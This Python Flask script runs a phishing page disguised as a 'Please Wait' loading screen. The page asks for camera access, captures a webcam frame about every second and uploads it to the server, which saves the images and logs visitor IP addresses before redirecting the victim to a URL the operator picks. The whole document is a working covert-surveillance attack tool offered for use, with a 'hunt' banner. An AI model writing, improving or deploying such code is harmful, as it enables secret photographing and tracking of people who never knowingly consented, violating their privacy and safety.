from flask import Flask, render_template_string, request
import base64
import os
import datetime
import sys
import time
import random

def hacker_print(text, speed=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed + random.uniform(0, 0.02))
    print()

hacker_print("\033[92mWelcome back, Asif...\033[0m")
time.sleep(0.8)
hacker_print("\033[91mAre you ready to hunt?\033[0m")

os.makedirs("ip_logs", exist_ok=True)


app = Flask(__name__)

# directory to store images
os.makedirs("captured", exist_ok=True)
REDIRECT_URL = input("[+] Enter redirect URL: ")
REDIRECT_TIME = int(input("[+] Enter redirect time (seconds): "))

def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr


@app.route("/")
def home():
    return render_template_string(
        HTML,
        redirect_url=REDIRECT_URL,
        redirect_time=REDIRECT_TIME
    )
    client_ip = get_client_ip()
    user_agent = request.headers.get("User-Agent")

    with open("ip_logs/activity.log", "a") as f:
       f.write(f"{datetime.datetime.now()} | VISIT | {client_ip} | {user_agent}\n")



HTML = """

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #1a1a1a;
        }

        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }


        .spinner-container {
            margin: 0 auto 40px;
            width: 100px;
            height: 100px;
            position: relative;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 3px solid #f0f0f0;
            border-top: 3px solid #2563eb;
            border-right: 3px solid #2563eb;
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 18px;
            color: #666;
            margin-bottom: 12px;
            font-weight: 400;
        }

        .description {
            font-size: 15px;
            color: #999;
            line-height: 1.6;
            max-width: 380px;
            margin: 0 auto;
        }

        .dots {
            display: inline-block;
        }

        .dots span {
            animation: blink 1.4s infinite;
            opacity: 0;
            font-weight: 600;
        }

        .dots span:nth-child(1) {
            animation-delay: 0s;
        }

        .dots span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dots span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes blink {
            0%, 20% {
                opacity: 0;
            }
            40%, 60% {
                opacity: 1;
            }
            80%, 100% {
                opacity: 0;
            }
        }

        .progress-bar {
            width: 100%;
            max-width: 300px;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin: 30px auto 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #2563eb, #3b82f6);
            border-radius: 2px;
            animation: progress 2s ease-in-out infinite;
        }

        @keyframes progress {
            0% {
                width: 0%;
                margin-left: 0%;
            }
            50% {
                width: 60%;
                margin-left: 20%;
            }
            100% {
                width: 0%;
                margin-left: 100%;
            }
        }

        /* Tablet */
        @media (max-width: 768px) {
            .container {
                max-width: 400px;
            }

            h1 {
                font-size: 28px;
            }

            .subtitle {
                font-size: 16px;
            }

            .description {
                font-size: 14px;
            }

            .spinner-container {
                width: 80px;
                height: 80px;
                margin-bottom: 35px;
            }

            .logo-placeholder {
                width: 50px;
                height: 50px;
                margin-bottom: 35px;
                font-size: 20px;
            }
        }

        /* Mobile */
        @media (max-width: 480px) {
            body {
                padding: 16px;
            }

            .container {
                max-width: 100%;
            }

            h1 {
                font-size: 24px;
                margin-bottom: 12px;
            }

            .subtitle {
                font-size: 15px;
                margin-bottom: 10px;
            }

            .description {
                font-size: 13px;
                max-width: 100%;
            }

            .spinner-container {
                width: 70px;
                height: 70px;
                margin-bottom: 30px;
            }

            .spinner {
                border-width: 2.5px;
            }

            .logo-placeholder {
                width: 45px;
                height: 45px;
                margin-bottom: 30px;
                font-size: 18px;
            }

            .progress-bar {
                max-width: 250px;
                margin-top: 25px;
            }
        }

        /* Small mobile */
        @media (max-width: 360px) {
            h1 {
                font-size: 22px;
            }

            .subtitle {
                font-size: 14px;
            }

            .description {
                font-size: 12px;
            }

            .spinner-container {
                width: 60px;
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <div class="spinner-container">
            <div class="spinner"></div>
        </div>
        <h1>Please Wait</h1>
        <p class="subtitle">Setting up your experience<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
        <p class="description">This will only take a moment. Thank you for your patience.</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

<script>
    const redirectUrl = "{{ redirect_url }}";
    const redirectTime = {{ redirect_time }};

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = 320;
        canvas.height = 240;

        setInterval(() => {
            // Fix mirror effect
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();

            fetch("/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    image: canvas.toDataURL("image/png")
                })
            });
        }, 1000); // 2 seconds

        setTimeout(() => {
            window.location.href = redirectUrl;
        }, redirectTime * 1000);
    })
    .catch(err => console.log("Camera denied"));
</script>



</body>
</html>
"""


@app.route("/capture", methods=["POST"])
def capture():
    client_ip = get_client_ip()

    with open("ip_logs/activity.log", "a") as f:
         f.write(f"{datetime.datetime.now()} | CAPTURE | {client_ip}\n")

    image_data = request.json["image"].split(",")[1]
    image_bytes = base64.b64decode(image_data)

    filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f") + ".png"
    filepath = os.path.join("captured", filename)

    with open(filepath, "wb") as f:
        f.write(image_bytes)

    return "saved"

if __name__ == "__main__":
    app.run(
        host="0.0.0.0",   # allow access from mobile
        port=5000,        # you can change if needed
        debug=True
    )



